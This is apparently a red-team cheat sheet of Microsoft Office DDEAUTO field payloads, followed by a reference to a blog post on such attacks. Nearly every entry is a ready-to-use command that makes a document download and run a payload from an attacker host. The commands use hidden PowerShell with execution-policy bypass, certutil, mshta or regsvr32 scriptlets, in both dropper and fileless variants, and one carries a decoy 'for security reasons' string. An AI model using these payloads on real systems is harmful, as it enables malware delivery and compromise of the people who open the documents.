# Execution Methods

## 01 - Dropper Payload

### 1.1 - EXEcutable

```
DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/payload.exe', 'payload.exe'); Start-Process -FilePath payload.exe -NoNewWindow [-WorkingDirectory C:\path\to\directory] "

DDEAUTO c:\\windows\\System32\\cmd.exe "/k certutil -urlcache -split -f http[s]://<attacker_IP>/payload.exe && payload.exe "
```

### 1.2 - JScript

```
DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/payload.js', 'payload.js'); Start-Process -FilePath cscript.exe -NoNewWindow -ArgumentList ("payload.js") [-WorkingDirectory C:\path\to\directory] "

DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/payload.js', 'payload.js'); & start C:\\Windows\\System32\\cmd.exe /c cscript.exe payload.js "

DDEAUTO c:\\windows\\System32\\cmd.exe "/k certutil.exe -urlcache -split -f http://willgenovese.com/hax/test.exe && test.exe "
```

### 1.3 - VBScript

```
DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/payload.vbs', 'payload.vbs'); Start-Process -FilePath cscript.exe -NoNewWindow -ArgumentList ("payload.vbs") [-WorkingDirectory C:\path\to\directory] "

DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/payload.vbs', 'payload.vbs'); & start C:\\Windows\\System32\\cmd.exe /c cscript.exe payload.vbs "
```

## 02 - Fileless Payload

### 2.1 - PowerShell

```
DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $payload=(New-Object System.Net.WebClient).DownloadString('http[s]://<attacker_IP>/payload.ps1');powershell -e $payload # " "for security reasons"
```

### 2.2 - HTA

```
DDEAUTO C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\mshta.exe http[s]://<IP>/payload.hta
```

### 2.3 - Scriptlet

```
DDEAUTO c:\\windows\\System32\\cmd.exe "/k regsvr32.exe /s /n /u /i:http[s]://<attacker_IP>/payload.sct scrobj.dll" 
```

---
## References

### Will Genovese

- [Will Genovese: Office DDEAUTO attacks](https://willgenovese.com/office-ddeauto-attacks/)